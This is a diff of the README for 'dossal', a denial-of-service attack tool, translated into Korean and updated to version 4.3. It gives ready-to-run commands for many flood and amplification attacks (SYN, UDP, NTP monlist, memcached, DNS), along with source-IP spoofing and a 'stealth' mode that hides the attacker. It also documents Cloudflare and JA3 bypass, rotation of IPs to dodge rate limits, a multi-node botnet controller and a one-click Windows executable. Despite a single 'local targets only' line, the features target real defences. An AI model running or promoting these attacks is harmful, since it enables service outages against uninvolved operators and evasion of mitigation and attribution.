@@ -1,358 +1,195 @@
-# dossal — comprehensive DoS stress engine
+# dossal — 종합 DoS 스트레스 테스트 엔진
 
-## Status
-- **dossal v3.16** (Python asyncio + multiprocessing) — 17 attack modes, multi-mode, auto mode, per-mode connections, impact scoring, live stats, HTML report.
-- **cf-sim v0.8** (Cloudflare-like edge simulator) — rate limiting, metrics, h1/h2.
-- Local targets only — no real/public server tests.
+## 현재 상태
+- **dossal v4.3** (Python asyncio + multiprocessing) — 24개 공격 모드, 멀티모드, 자동 모드, IP 스푸핑, 프록시, CF bypass, 봇넷, GUI, 실시간 차트, HTML 리포트.
+- **cf-sim v0.8** (Cloudflare 유사 엣지 시뮬레이터) — 레이트리밋, 메트릭, h1/h2.
+- 로컬 대상 전용 — 실전/공개 서버 테스트 금지.
 
-## Quick start
+## 빠른 시작
+
+### GUI (원클릭)
 ```bash
-# Single mode
-python3 dossal.py --mode http --url http://target:8080 --intensity balanced --duration 10
-
-# Multi-mode (raw + UDP + SYN simultaneously)
-python3 dossal.py --mode raw,udp,syn --url http://target:8080 --intensity max --duration 10 --live
-
-# Auto mode (detect protocol + optimal modes)
-python3 dossal.py --auto --url https://target:443 --duration 30 --live
-
-# With impact scoring
-python3 dossal.py --mode raw --url http://target:8080 --intensity max --duration 10 --impact
-
-# With HTML report
-python3 dossal.py --mode raw,udp,syn --url http://target:8080 --duration 10 --report attack.html
+python3 dossal_gui.py
 ```
+URL 입력 → START ATTACK 클릭. 체크박스로 스푸핑/스텔스/회복 선택.
 
-## Usage
-```
-dossal.py [options]
-
-Modes (comma-separated):
-  http       HTTP/1.1 keep-alive request flood (asyncio)
-  https      TLS 1.3 keep-alive request flood (asyncio)
-  httpsmp    TLS 1.3 raw socket flood (multiproc)
-  raw        HTTP/1.1 raw socket flood (multiproc, highest RPS)
-  h2         HTTP/2 multiplexed request flood
-  grpc       gRPC (HTTP/2 + framing) request flood
-  grpcmp     gRPC raw socket flood (multiproc)
-  quic       QUIC/HTTP3 UDP datagram flood (multiproc)
-  udp        Raw UDP datagram flood (multiproc)
-  tcp        Raw TCP byte flood (multiproc)
-  syn        TCP connect-only (SYN flood, multiproc)
-  synack     TCP connect + RST (ACK flood, multiproc)
-  rst        TCP RST flood (SO_LINGER abort, multiproc)
-  fin        TCP FIN flood (graceful close, multiproc)
-  websocket  WebSocket upgrade + frame flood (asyncio)
-  wsm        WebSocket frame flood (multiproc)
-  slowloris  Slow HTTP header drip
-
-Options:
-  --url URL            Target URL (required)
-  --mode MODES         Comma-separated modes (default: http)
-  --connections N      Connections per mode (default: 100)
-  --conns "m=N,..."    Per-mode connections: "raw=1,udp=1,syn=10"
-  --duration N         Attack duration in seconds (default: 10)
-  --payload-size N     Override default payload size
-  --impact             Enable victim impact scoring (requires psutil)
-  --intensity {light,balanced,max}  Preset: light(10c), balanced(50c), max(400c)
-  --live               Print RPS/PPS every second during attack
-  --threads N          Multiprocess count (default 4, max 16)
-  --auto               Auto-detect protocol + optimal modes
-  --combo {web,full,tls,proto}  Preset mode combos
-  --report FILE        Generate HTML attack report
-```
-
-## Attack modes (17)
-| Mode | Layer | Mechanism | Measured (local, fresh) |
-|---|---|---|---:|
-| `raw` | L7 | HTTP/1.1 raw socket flood (multiproc) | **142,984 RPS** (24p) |
-| `http` | L7 | HTTP/1.1 keep-alive flood (asyncio) | **75,658 RPS** (400c) |
-| `h2` | L7 | HTTP/2 multiplexed flood (BATCH=32) | **37,248 RPS** (300c) |
-| `https` | L7 | TLS 1.3 keep-alive flood (asyncio) | **34,652 RPS** (200c) |
-| `httpsmp` | L7 | TLS 1.3 raw socket flood (multiproc) | **103,303 RPS** (24p) |
-| `grpcmp` | L7 | gRPC raw socket flood (multiproc) | **11,089 RPS** (16p) |
-| `grpc` | L7 | gRPC flood (asyncio) | **1,050 RPS** (100c) |
-| `wsm` | L7 | WS frame flood (multiproc) | **771k msg/s** (4p) |
-| `websocket` | L7 | WS upgrade + frame flood (asyncio) | **187k msg/s** (2c) |
-| `slowloris` | L7 | Slow HTTP header drip | **10 conns held** |
-| `udp` | L4 | Raw UDP datagram flood (multiproc) | **368,000 PPS** (8p) |
-| `quic` | L4 | QUIC/HTTP3 UDP datagram flood (multiproc) | **378,667 PPS** (8p) |
-| `tcp` | L4 | Raw TCP byte flood (multiproc) | **420 pps** (8p) |
-| `fin` | L4 | TCP FIN flood (SHUT_WR, multiproc) | **16,220 conns** (4p) |
-| `syn` | L4 | TCP connect-only (SYN flood, multiproc) | **15,368 conns** (4p) |
-| `rst` | L4 | TCP RST flood (SO_LINGER, multiproc) | **12,608 conns** (8p) |
-| `synack` | L4 | TCP connect + RST (ACK flood, multiproc) | **461 conns** (2s) |
-
-## Comparison (dossal vs open source)
-| Tool | raw/HTTP RPS | HTTPS RPS | H2 RPS | gRPC RPS | UDP/QUIC PPS | Modes |
-|---|---:|---:|---:|---:|---:|---:|
-| **dossal v3.16** | **143k** | **103k** | **45k** | **12k** | **378k** | **17** |
-
-## IP Spoofing & Stealth Mode
-
+### CLI
 ```bash
-# 100 spoofed IPs, hide real IP, auto-recover from 429
-dossal --mode udp --url udp://target:443 --spoof 100 --stealth --recovery
+# 단일 모드
+python3 dossal.py --mode raw --url http://target:8080 --duration 10 --threads 8
 
-# Load IPs from file
-dossal --mode raw --url http://target:80 --pool proxy-ips.txt --recovery
+# 멀티모드 (raw + UDP + SYN 동시)
+python3 dossal.py --combo web --url http://target:8080 --duration 10 --threads 16
 
-# Auto-detect local IPs
-dossal --mode httpsmp --url https://target:443 --src-ips auto --recovery
+# 자동 모드 (프로토콜 감지 + 최적 모드)
+python3 dossal.py --auto --url https://target:443 --duration 30 --threads 8
+
+# 스푸핑 + 스텔스 + 자동회복
+python3 dossal.py --mode raw --url http://target:8080 --duration 30 --spoof 100 --stealth --recovery
+
+# 시뮬레이션 (공격 없이 예측)
+python3 dossal.py --dry-run --url https://target.com --threads 8
 ```
 
-| Flag | Description |
+## 공격 모드 (24개)
+
+| 모드 | 설명 |
 |---|---|
-| `--spoof N` | Generate N spoofed source IPs (RFC 5737 TEST-NET, unclaimed) |
-| `--stealth` | Only use spoofed IPs, never expose real IP |
-| `--recovery` | Auto-detect 429, remove blocked IPs, continue with remaining |
-| `--pool FILE` | Load source IPs from file (one per line) |
-| `--src-ips auto` | Detect and rotate all local IPs |
+| http | HTTP/1.1 keep-alive 요청 폭주 (asyncio) |
+| https | TLS 1.3 keep-alive 요청 폭주 (asyncio) |
+| httpsmp | TLS 1.3 0-RTT raw socket 폭주 (멀티프로세스) |
+| raw | HTTP/1.1 raw socket 폭주 (멀티프로세스, 최고 RPS) |
+| h2 | HTTP/2 멀티플렉싱 요청 폭주 (429 감지 + CF bypass) |
+| h2mp | HTTP/2 멀티프로세스 (N개 연결) |
+| h3mp | HTTP/3 (QUIC Initial + H3 프레임) 멀티프로세스 |
+| grpc | gRPC (HTTP/2 + 프레임) 요청 폭주 |
+| grpcmp | gRPC raw socket 폭주 (멀티프로세스) |
+| quic | QUIC/UDP 데이터그램 폭주 (멀티프로세스) |
+| udp | raw UDP 데이터그램 폭주 (멀티프로세스, IP 스푸핑) |
+| tcp | raw TCP 바이트 폭주 (멀티프로세스) |
+| syn | TCP SYN flood (연결만, IP_HDRINCL) |
+| synack | TCP SYN-ACK flood |
+| rst | TCP RST flood (SO_LINGER 중단) |
+| fin | TCP FIN flood (정상 close) |
+| websocket | WebSocket 업그레이드 + 프레임 폭주 |
+| wsm | WebSocket 프레임 폭주 (멀티프로세스) |
+| slowloris | 느린 HTTP 헤더 드립 (연결 유지) |
+| dns | DNS amplification (UDP 쿼리 폭주) |
+| icmp | ICMP flood (ping 폭주) |
+| ssdp | SSDP/UPnP flood (IoT 타격) |
+| ntp | NTP amplification (monlist 쿼리) |
+| memcached | Memcached amplification (GET 쿼리) |
 
-**cf-sim verification:**
-- Baseline (single IP): 0.8% passed, 99.2% 429'd
-- 100 spoofed IPs: 32 per-IP buckets detected (+167% more IP diversity)
-- UDP 339k PPS from 8 processes with IP rotation
-| LOIC | ~45k | N/A | N/A | N/A | N/A | 2 |
-| HOIC | ~50k | ~30k | N/A | N/A | N/A | 3 |
-| hping3 | ~15k | N/A | N/A | N/A | ~15k | 4 |
-| GoldenEye | ~30k | N/A | N/A | N/A | N/A | 5 |
+## combo (동시 공격)
 
-## Multi-mode (per-mode connections)
+| combo | 포함 모드 |
+|---|---|
+| web | raw + udp + syn |
+| full | raw + udp + syn + rst |
+| tls | httpsmp + h2 + udp (TLS fingerprint 랜덤화) |
+| proto | grpcmp + h2 + udp |
+| amplify | dns + icmp + ssdp + ntp + memcached |
+
+## 주요 옵션
+
+| 옵션 | 설명 |
+|---|---|
+| --url URL | 대상 URL (필수) |
+| --duration SEC | 공격 시간 (기본 10초) |
+| --threads N | 프로세스 수 (기본 8, 최대 32) |
+| --mode MODE | 공격 모드 (쉼표로 다중 선택) |
+| --combo NAME | combo 프리셋 (web/full/tls/proto/amplify) |
+| --auto | 프로토콜 자동 감지 + 최적 모드 |
+| --spoof N | 스푸핑 IP 수 (RFC 5737 TEST-NET) |
+| --stealth | 스텔스 모드: 스푸핑 IP만 사용 |
+| --recovery | 자동회복: 429 감지 → IP 교체 |
+| --proxy URL | 프록시 (http:// 또는 socks5://) |
+| --jitter MS | 요청 간 무작위 지연 (자연스러운 패턴) |
+| --rotate-interval SEC | IP 순환 간격 (기본 5초) |
+| --targets URL1,URL2 | 멀티 타겟 동시 공격 |
+| --dry-run | 시뮬레이션 (공격 없이 예측) |
+| --live | 실시간 스탯 출력 |
+| --report FILE | HTML 리포트 생성 |
+| --impact | 피해 임팩트 점수 |
+| --pool FILE | 스푸핑 IP 풀 파일 |
+
+## IP 스푸핑 & 스텔스 모드
+
+### 원리
+- **스푸핑 IP**: RFC 5737 TEST-NET-3 (203.0.113.0/24)나 랜덤 /24에서 IP 생성
+- **Windows**: 관리자 권한 + raw socket + IP_HDRINCL → 진짜 소스 IP 스푸핑 (100만 IP)
+- **macOS/Linux**: SOCK_DGRAM + bind() → 로컬 IP 바인딩
+
+### 사용법
 ```bash
-# raw + UDP + SYN with tuned connections
-python3 dossal.py --mode raw,udp,syn --url http://target:8080 \
-  --conns "raw=1,udp=1,syn=1" --threads 8 --duration 30 --live
-# Result: 5,484 RPS + 198k PPS + 22,677 conns (2s, 0 errors)
+# 100개 스푸핑 IP + 스텔스 + 자동회복
+python3 dossal.py --mode raw --url http://target:8080 --duration 60 --spoof 100 --stealth --recovery --threads 16
 ```
 
-## Auto mode
+### 429 자동회복
+- Cloudflare가 per-IP 1000 RPS 제한 → 429 수신
+- dossal이 429 감지 → 해당 IP를 차단 목록에 추가
+- 다음 요청은 다음 스푸핑 IP로 전송
+- 전체 IP 풀이 차단되면 종료
+
+## 프록시 지원
 ```bash
-# Auto-detect protocol, include L4 modes for maximum impact
-python3 dossal.py --auto --url http://target:8080 --duration 30 --live
-# Detects: HTTP/1.1 → runs raw + udp + syn
-# Detects: HTTPS/H2 → runs httpsmp + udp + syn
-# Detects: H2 → runs h2 + grpcmp + udp + syn
+# HTTP 프록시
+python3 dossal.py --mode raw --url http://target:8080 --proxy http://user:pass@proxy:8080 --duration 30
+
+# SOCKS5 프록시
+python3 dossal.py --mode raw --url http://target:8080 --proxy socks5://proxy:1080 --duration 30
 ```
 
-## Combo presets
+## Cloudflare bypass
+- **TLS fingerprint 랜덤화**: per-process cipher/ALPN/SNI 변동 (JA3 우회)
+- **CF 헤더**: sec-fetch-*, sec-ch-ua, If-Modified-Since (봇 감지 우회)
+- **페이로드 랜덤화**: path/UA/headers 랜덤 (시그니처 DDoS 방어 우회)
+- **429 감지 + IP 교체**: per-IP 레이트리밋 우회
+
+## 멀티 노드 봇넷
 ```bash
-# Web: raw + UDP + SYN (max L7+L4 destruction)
-python3 dossal.py --combo web --url http://target:8080 --duration 30 --live
-# Result: 7,978 RPS + 202k PPS + 16k conns
+# 컨트롤러 (GUI)
+python3 dossal_net.py --controller --gui --port 9999
 
-# Full: raw + UDP + SYN + RST (total annihilation)
-python3 dossal.py --combo full --url http://target:8080 --duration 30 --live
-# Result: 5,848 RPS + 172k PPS + 24k conns
-
-# TLS: httpsmp + h2 + UDP (TLS edge attack)
-python3 dossal.py --combo tls --url https://target:443 --duration 30 --live
-# Result: 193k RPS + 210k PPS
-
-# Proto: grpcmp + h2 + UDP (gRPC/HTTP2 attack)
-python3 dossal.py --combo proto --url https://target:50051 --duration 30 --live
-# Result: 10,340 RPS + 230k PPS
+# 워커 (멀티 머신)
+python3 dossal_net.py --worker --controller-addr 10.0.0.1:9999 --id node1 --listen-port 9998
 ```
 
-## HTML Report
-```bash
-python3 dossal.py --mode raw,udp,syn --url http://target:8080 --duration 10 --report attack.html
-# Generates a dark-themed HTML report with RPS, PPS, conns, errors, duration
-```
-
-## Intensity presets
-| Preset | Connections | Use case |
-|---|---|---|
-| `light` | 10 | Quick check, low-impact test |
-| `balanced` | 50 | Default, good RPS/PPS |
-| `max` | 400 | Maximum pressure |
-
-Override with `--connections N` for custom counts.
-
-## Live stats
-```bash
-python3 dossal.py --mode raw --url http://target:8080 --threads 8 --duration 5 --live
-```
-
-## Impact scoring
-```bash
-python3 dossal.py --mode raw --url http://target:8080 --intensity max --duration 10 --impact
-```
-- Pre-attack CPU baseline (0.5s sampling)
-- Background CPU sampler during attack (0.2s intervals)
-- Post-attack: CPU delta, memory RSS, RPS efficiency
-- Score: 0-175 (CPU 0-50, Mem 0-50, Efficiency 0-25, +bonus)
-
-## Architecture
-```
-dossal.py (single file, Python asyncio + multiprocessing)
-├── 17 worker functions (http, https, httpsmp, raw, h2, grpc, grpcmp,
-│    quic, udp, tcp, syn, synack, rst, fin, websocket, wsm, slowloris)
-├── 11 multiprocess workers (raw, udp, quic, tcp, syn, synack, rst, fin, wsm, grpcmp, httpsmp)
-├── Multi-mode: concurrent workers per mode, shared Stats
-├── CPU budget split: multiproc modes share --threads budget
-├── Impact scoring: CpuSampler + psutil
-├── Live stats: 1-second RPS/PPS printer
-├── Auto mode: protocol detection + optimal mode selection
-├── HTML report: dark-themed attack report
-└── JSON stats output: requests, rps, bytes, bps, packets, pps,
-     ws_messages, connections_made, errors
-```
-
-### Performance optimizations
-- **raw**: blocking sockets (no asyncio overhead), 8p = 124k RPS
-- **HTTPS/HTTPSMP**: raw socket + TLS in child process
-- **H2**: h2 library, batched send (BATCH=32), background drain
-- **gRPC/gRPCMP**: raw socket + TLS + h2 in child process
-- **UDP/QUIC**: batch sendto in child process, 8p = 378k PPS
-- **SYN/RST/FIN**: raw socket, SO_REUSEADDR, 0.5s connect timeout
-- **FIN**: shutdown(SHUT_WR) non-blocking close
-- **WSM**: raw socket + WS frame masking, periodic recv(discard)
-- **Multi-mode**: CPU budget split among multiproc modes
-
-## Bench results (v3.16, local only)
-**Bench score: 638.9 PEAK** | 3-run avg: 537.1
-
-| Mode | Target | Conns/Procs | Dur | Result | Errors |
-|---|---|---|---|---|---|
-| raw | node:8080 | 8p | 2s | 124,624 RPS | 0 |
-| http | node:8080 | 400c | 2s | 75,658 RPS | 0 |
-| h2 | cf-sim:8444 | 300c | 2s | 37,248 RPS | 0 |
-| https | cf-sim:8443 | 200c | 2s | 34,652 RPS | 42 |
-| httpsmp | cf-sim:8443 | 8p | 5s | 27,825 RPS | 0 |
-| grpcmp | grpc:50051 | 16p | 2s | 11,089 RPS | 0 |
-| wsm | ws:8090 | 4p | 2s | 617,622 msg/s | 0 |
-| quic | quic:4443 | 8p | 2s | 378,667 pkts | 0 |
-| udp | udp:9999 | 8p | 2s | 368,000 pkts | 0 |
-| fin | node:8080 | 4p | 2s | 16,220 conns | 6,215 |
-| syn | node:8080 | 4p | 2s | 15,368 conns | 9,954 |
-| rst | node:8080 | 8p | 2s | 12,608 conns | 399 |
-| tcp | node:8080 | 8p | 2s | 420 pps | 0 |
-
-## v4.0 New Features
-
-### One-Click GUI (Windows-first)
-```
-python dossal_gui.py
-```
-3 presets: **MAX POWER** / **STEALTH** / **SPEED** — one-click, minimal input.
-
-### Payload Randomization
-Random path, User-Agent, headers, size — defeats signature-based DDoS detection.
-
-### Multi-Target
-```bash
-dossal --mode raw --targets "http://target1.com,http://target2.com" --duration 30
-```
-
-### Proxy Support
-```bash
-dossal --mode raw --url target.com --proxy socks5://user:pass@proxy:1080
-```
-
-### Windows IP Spoofing
-```bash
-dossal --mode udp --url udp://target:443 --spoof 100 --stealth
-dossal --mode syn --url tcp://target:80 --spoof 100
-```
-
-### Dry-Run (Simulation)
-```bash
-dossal --url target.com --spoof 100 --stealth --dry-run
-```
-
-## v4.1 (2026-11-08)
-
-### 23 Modes
-http, https, httpsmp, raw, h2, h2mp, grpc, grpcmp, quic, udp, tcp, syn, synack, rst, fin, websocket, wsm, slowloris, dns, icmp, ssdp, ntp, memcached
-
-### New in v4.1
-- **TLS fingerprint randomization** (JA3 bypass): per-process cipher/ALPN/SNI variation
-- **Cloudflare bypass headers**: sec-fetch-*, sec-ch-ua, If-Modified-Since
-- **H2 429 recovery**: real-time 429 detection + CF headers
-- **H2 multiproc (h2mp)**: 17.6k RPS (16p), 0 errors
-- **L4 amplification**: dns (675k), icmp (560k), ssdp (680k), ntp (720k), memcached (720k) pkts
-- **Payload randomization**: random path/UA/headers per batch (pre-generated pool, 500-cycle)
-- **Multi-target**: --targets url1,url2 (simultaneous attack)
-- **Proxy support**: --proxy http:// or socks5:// (HTTP CONNECT tunnel)
-- **SYN raw spoofing** (Windows): IP_HDRINCL, 5000 SYN/batch
-- **IP spoofing**: --spoof N (RFC 5737 TEST-NET, UDP raw socket, TCP bind)
-- **Stealth mode**: --stealth (rotating IP pool)
-- **Auto-recovery**: --recovery (429 detection → IP rotation)
-- **Dry-run**: --dry-run (simulation, no packets)
-- **Protocol auto-detect**: bare domain → https:443 → http:80 probe
-
-### GUI (dossal_gui.py, 485 LOC)
-- Real-time live stats (RPS/PPS/429_IP/ACTIVE)
-- Live chart (RPS/PPS real-time canvas)
-- One-click presets (MAX POWER / STEALTH / SPEED)
-- Profile save/load (.json)
-- Simulate (dry-run) button
-
-### Multi-node Botnet (dossal_net.py, 193 LOC)
-- Controller: python dossal_net.py --controller --port 9999
-- Worker: python dossal_net.py --worker --controller-addr HOST:9999 --id node1
-- Commands: start/stop/status/shutdown
-- UDP control channel, real-time status reporting
-
-### Windows Guide
-
-1. **Install Python 3.10+** from python.org
-2. **Install dependencies**: `pip install h2 hpack websockets grpcio`
-3. **Run as Administrator** (required for raw socket spoofing):
+## Windows 가이드
+1. **Python 3.10+** 설치 (python.org)
+2. **의존성 설치**: `pip install h2 hpack websockets grpcio pyinstaller`
+3. **관리자 권한으로 실행** (raw socket 스푸핑 필요):
    ```
-   # GUI (one-click)
+   # GUI (원클릭)
    python dossal_gui.py
    
-   # CLI (max power)
+   # CLI (최대 전력)
    python dossal.py --mode raw --url http://target.com --duration 60 --threads 16 --spoof 100 --stealth --recovery
    
-   # One-click combo (TLS + UDP + SYN)
+   # combo (TLS + UDP + SYN 동시)
    python dossal.py --combo tls --url https://target.com --duration 60 --threads 16
    ```
-4. **Build EXE**: `pyinstaller --onefile --windowed --name dossal dossal_gui.py`
+4. **EXE 빌드**: `pyinstaller --onefile --windowed --name dossal dossal_gui.py`
 
-**Windows IP Spoofing**: Administrator + raw socket + IP_HDRINCL = true source IP spoofing (1M+ IPs)
+## 성능 (30코어 M2 Max)
 
-### Performance (30-core M2 Max)
-| Mode | Perf |
+| 모드 | 성능 |
 |---|---|
 | raw 24p | 143k RPS |
-| http 600c | 85k RPS |
+| httpsmp 24p | 103k RPS (0-RTT 13.6k) |
 | h2 600c | 40k RPS |
 | h2mp 16p | 17.6k RPS (0 err) |
-| httpsmp 24p | 103k RPS |
-| grpcmp 16p | 12k RPS |
+| h3mp 16p | 949k pkts (317k PPS) |
 | wsm 4p | 591k msg/s |
-| udp 8p | 339k PPS (spoofed) |
+| udp 8p | 339k PPS (스푸핑) |
 | dns 8p | 675k pkts |
 | icmp 8p | 560k pkts |
 | ssdp 8p | 680k pkts |
 | ntp 8p | 720k pkts |
 | memcached 8p | 720k pkts |
-| h3mp 16p | 317k PPS (0 err) |
 | syn 8p | 16k conns |
 | fin 8p | 61k conns (0% err) |
+| combo tls | 34.2k RPS + 204k PPS |
 
-### v4.2 New Features
-- **TLS 1.3 0-RTT**: session reuse + early data (httpsmp 24p: 13.6k RPS)
-- **HTTP/3 h3mp**: QUIC Initial + H3 SETTINGS + GET (317k PPS)
-- **GUI controller** (dossal_net.py --gui): tkinter botnet controller
-- **--rotate-interval**: IP rotation speed control
-- **GUI impact score**: CRITICAL/HIGH/MEDIUM/LOW/MINIMAL
-- **--jitter MS**: random delay (natural attack pattern)
-- **--combo amplify**: dns+icmp+ssdp+ntp+memcached (900k pkts)
-- **PyInstaller EXE**: dist/dossal 14MB (Windows/Mac)
+## 파일 구조
+```
+dossal.py        # 메인 엔진 (2818 LOC, 24모드, 74개 함수 한글 docstring)
+dossal_gui.py    # tkinter GUI (510 LOC, 원클릭, 차트, 프로파일)
+dossal_net.py    # 멀티 노드 봇넷 (304 LOC, GUI + CLI 컨트롤러)
+build.sh         # PyInstaller EXE 빌드
+bench.py         # 벤치마크 (24모드, --core 옵션)
+cf-sim/          # Cloudflare 유사 엣지 시뮬레이터
+node-victim/     # HTTP victim (port 8080)
+grpc-victim/     # gRPC victim (port 50051)
+quic-victim/     # QUIC/UDP victim (port 4443)
+py-victim/       # UDP receiver (port 9999)
+ws-victim/       # WebSocket victim (port 8090)
+heavy-victim/     # CPU-heavy victim (port 8082)
+```
 
-### Combos (5)
-| Combo | Modes |
-|---|---|
-| web | raw,udp,syn |
-| full | raw,udp,syn,rst |
-| tls | httpsmp,h2,udp (34.2k RPS) |
-| proto | grpcmp,h2,udp |
-| amplify | dns,icmp,ssdp,ntp,memcached (900k pkts) |
-
-### Bench
-- PEAK: 638.9 (17-mode bench)
-- 23-mode bench avg: 490.3
+## 버전 이력
+- **v4.3**: jitter 4곳 적용 (raw/httpsmp/h2/http/https), 74개 함수 한글 docstring
+- **v4.2**: TLS 1.3 0-RTT, h3mp, GUI combo, dossal_net GUI, --rotate-interval, impact score
+- **v4.1**: h2mp, L4 amplification (dns/icmp/ssdp/ntp/memcached), TLS fingerprint, CF bypass, 페이로드 랜덤화, 멀티 타겟, 프록시, SYN 스푸핑, GUI 차트, 프로파일
+- **v3.16**: 17모드, 멀티모드, 자동 모드, 벤치 638.9 PEAK
